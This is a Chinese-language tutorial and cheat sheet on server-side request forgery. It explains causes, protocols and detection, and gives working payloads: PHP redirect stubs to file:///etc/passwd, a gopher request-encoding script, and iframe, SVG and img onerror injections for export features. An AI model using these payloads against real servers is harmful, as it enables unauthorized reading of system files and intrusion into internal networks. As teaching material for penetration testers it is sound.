# SSRF

SSRF漏洞，也就是服务端请求伪造，是指攻击者欺骗服务器发起网络请求，可能导致对内部系统、外部服务或本地资源的未授权访问。

## 漏洞成因：

web服务器经常需要从别的服务器获取数据，比如文件载入、图片拉取、图片识别等功能，

如果获取数据的服务器地址可控，攻击者就可以通过web服务器自定义向别的服务器发出请求。

因为web服务器常搭建在DMZ区域，因此常被攻击者当作跳板，向内网服务器发出请求。

> DMZ区域
>
> DMZ（Demilitarized Zone）是网络安全中的一个术语，它指的是位于内部网络和外部网络之间的一个隔离区域。
>
>DMZ提供了一个额外的安全层，用于分离和保护内部网络中的敏感系统和数据免受来自外部网络的攻击。
>
> 在一个典型的网络架构中，DMZ通常位于防火墙内部，同时连接着外部网络和内部网络。
>
> DMZ中放置了一些对外服务，如Web服务器、邮件服务器等。这些对外服务需要与外部网络进行通信，但又不能直接接触内部网络中的敏感系统和数据。

## 协议

ssrf常用的协议：http/https、dict、file、gopher、sftp、ldap、tftp

### http/https

当ssrf限制只能使用http或https协议，可通过Header函数绕过限制。在vps创建一个302.php的文件，根据需求设置协议类

举例

    <?php
    header("Location: file:///etc/passwd");
    ?>
    
    <?php
    header("Location: dict://127.0.0.1:6666/info");
    ?>
    
    <?php
    header("Location: gopher://127.0.0.1:6666/info");
    ?>

### gopher

> Gopher是Internet上非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便将用户从Internet的一处带到另一处。
>
> 但WWW出现以后，就很少使用Gopher了

#### gopher使用限制

    PHP     --write-curlwrappers且php版本至少为5.3
    
    Java    小于JDK1.7
    
    Curl    低版本不支持
    
    Perl    支持
    
    ASP.NET 小于版本3

#### 格式

    gopher://<host>:<port>/<path>_后接TCP数据流
    
> gopher默认端口是70
>
> 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码

#### 利用gopher协议发送POST请求

脚本举例

    import urllib.parse
    test =\
    """POST / HTTP/1.1
    Host: 127.0.0.1:8000
    Content-Typr: application/x-www-form-urlencoded
    Content-Length: 11
    
    name=xxx
    """  
    #以上内容放置请求包内容，注意后面一定要有回车，回车结尾表示http请求结束
    tmp = urllib.parse.quote(test)
    new = tmp.replace('%0A','%0D%0A')
    result = '_'+new
    print(result)

除了发出HTTP请求外，gopher协议还常被用来攻击内网redis、Zabbix、FastCGI、mysql等服务

利用工具：

    https://github.com/tarunkant/Gopherus

## 利用

所有需要输入url的地方都可以尝试ssrf，将url改成dnslog地址，验证请求IP是否来自web服务器：

* 远程图片拉取
* xls，doc等文件预览
* 头像加载
* 其他网站的访问截图

ssrf漏洞可分为有回显型和无回显型

### 回显型

有回显型ssrf可以直接通过页面加载出目标资产，可先尝试加载http://www.baidu.com 页面确认有ssrf，

如果成功的话，可进一步将百度换成内网IP，通过fuzz扫描内网资产。

#### 场景

##### SVG SSRF

由于 SVG 的功能十分丰富，所以能够处理SVG 的服务器就很有可能遭受到 SSRF、XSS、RCE 等的攻击，特别是在没有禁用一些特殊字符的情况下。

svg攻击payload

    https://github.com/allanlw/svg-cheatsheet
    
##### 导出功能SSRF

有些网站存在功能，能够将一些将数据分析的表格导出为pdf或者图片，当POST数据包中，以html文件内容作为传输，则这里可能存在ssrf漏洞

我们将html内容修改为

    <svg><iframe src="攻击者服务器ip" width="800" height="850"/></svg>
    
通过攻击者服务器进行302重定向

    <iframe+src=攻击者服务器302重定向的地址">
     
    原理：
    通过header设置Location: file:///etc/passwd
    
常规payload

    <iframe src="file:///etc/password">
    document.location
    <img src=x onerror="document.write(document.location)"/>
    <img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
    <link rel=attachment href="file:///etc/passwd">
    <img src=x onerror=document.write(window.location)>
  

### 无回显型

无回显型ssrf的检测需要先配合dnslog平台，测试dnslog平台能否获取到服务器的访问记录，如果没有对应记录，也可能是服务器不出网造成的，

利用时可以通过请求响应时间判断内网资产是否存在，

然后再利用内网资产漏洞（比如redis以及常见可RCE的web框架）证明漏洞的有效性。

或者可以尝试寻找内网的Confluence, Jenkins等资产，这篇文章是专门介绍bind ssrf利用技巧的，可以作为参考：

    https://github.com/assetnote/blind-ssrf-chains
